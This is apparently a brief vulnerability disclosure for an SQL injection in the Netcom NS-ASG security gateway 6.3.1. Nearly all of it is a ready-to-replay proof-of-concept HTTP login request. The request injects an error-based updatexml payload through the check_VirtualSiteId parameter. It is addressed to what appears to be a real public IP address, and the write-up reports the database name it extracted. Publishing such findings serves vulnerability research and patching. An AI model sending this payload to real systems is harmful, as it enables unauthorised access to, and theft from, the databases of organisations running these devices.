Netcom NS-ASG application security gateway has SQL injection vulnerability

version:6.3.1

![image](https://github.com/fixitc/cve/assets/63436381/c103210a-2257-401d-aa74-2dadb0cc9aa8)


1. Get the current database name directly through the following POC

```
POST /vpnweb/index.php?para=index HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=ac6843ae1512b5fcf111b5af0bc4f90e; reachstone_uid=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Origin: https://218.75.78.54:4443
Referer: https://218.75.78.54:4443/vpnweb/index.php?para=index
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 1.1.1.1
Te: trailers
Connection: close

check_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(database())),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif
```
![image](https://github.com/fixitc/cve/assets/63436381/fe11ad86-80e5-4d72-a004-7156d7139120)
The database name is：iscserver
